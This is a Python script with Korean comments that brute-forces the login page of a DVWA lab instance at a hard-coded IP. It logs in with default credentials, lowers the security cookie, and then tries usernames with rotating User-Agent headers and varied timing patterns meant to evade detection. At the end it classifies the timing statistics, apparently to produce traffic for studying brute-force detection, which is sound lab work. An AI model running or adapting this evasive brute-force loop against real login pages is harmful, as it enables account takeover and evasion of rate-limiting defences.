import requests
import time
import random
import numpy as np
from bs4 import BeautifulSoup

BASE_URL = "http://13.209.16.100:8000"
LOGIN_URL = BASE_URL + "/login.php"
BRUTE_URL = BASE_URL + "/vulnerabilities/brute/"

USER_AGENTS = [ #13개 user agent
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/122.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1)",
    "Mozilla/5.0 Firefox/124.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/117.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro Build/AD1A.240418.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.54 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone17,5; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 FireKeepers/1.7.0",
    "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36"
]

USER_IDS = ["admin", "root", "user", "test", "guest", "cju", "user", "soccer", "secret", "jordan", "fuckyou", "loveme", "football", "surperman"]

# =========================
# 패턴 선택
# =========================
print("""
1. 빠르게 → 느리게
2. 느리게 → 빠르게
3. 랜덤 (8~600초)
4. 수동 입력
5. 일반 브루트포스 (고정)
""")

mode = int(input("패턴 선택: "))
count = int(input("시도 횟수: "))

intervals = []
prev_time = None

# =========================
# 세션 + 로그인
# =========================
session = requests.Session()

session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Referer": LOGIN_URL
})

# 🔥 토큰 가져오기
res = session.get(LOGIN_URL)
soup = BeautifulSoup(res.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

# 🔥 로그인
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

res = session.post(LOGIN_URL, data=login_data)

if "login.php" in res.url:
    print("❌ 로그인 실패")
    exit()
else:
    print("✅ 로그인 성공")

session.cookies.set("security", "low")       #DVWA 보안 설정 변경 

# =========================
# 공격 시작
# =========================
for i in range(count):

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(["ko-KR", "en-US", "ja-JP"])
    }

    username = random.choice(USER_IDS)
    password = f"guess{i}"

    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    try:
        res = session.get(
            BRUTE_URL,
            params=params,
            headers=headers,
            timeout=5
        )

        print(f"[{i}] id={username} pw={password} | status={res.status_code}")

        if "login.php" in res.url:
            print("⚠️ 세션 끊김")
            break

    except Exception as e:
        print(f"[!] 요청 실패: {e}")
        continue

    # =========================
    # interval 계산
    # =========================
    now = time.time()
    if prev_time:
        interval = now - prev_time
        intervals.append(interval)
    prev_time = now

    # =========================
    # 패턴별 대기
    # =========================
    if mode == 1:
        wait = random.uniform(3, 10) if i < count//2 else random.uniform(20, 120)
    elif mode == 2:
        wait = random.uniform(20, 120) if i < count//2 else random.uniform(3, 10)
    elif mode == 3:
        wait = random.uniform(8, 600)   #8초 ~ 60초 디벨롭
    elif mode == 4:
        wait = float(input("대기 시간 입력: "))
    elif mode == 5:
        wait = 1
    else:
        wait = 3

    print(f"    → wait={wait:.2f}s")
    time.sleep(wait)

# =========================
# 분석 결과
# =========================
print("\n===== 분석 결과 =====")

if len(intervals) > 1:
    avg = np.mean(intervals)
    std = np.std(intervals)
    cv = std / avg if avg != 0 else 0

    print(f"평균 간격: {avg:.2f}")
    print(f"표준편차: {std:.4f}")
    print(f"CV: {cv:.4f}")

    if std < 0.3:
        print("👉 일반 브루트포스")
    elif std < 3 and avg > 5:
        print("👉 슬로우 브루트포스")
    elif std >= 3:
        print("👉 랜덤/우회 공격")
    else:
        print("👉 불명확")

else:
    print("데이터 부족")
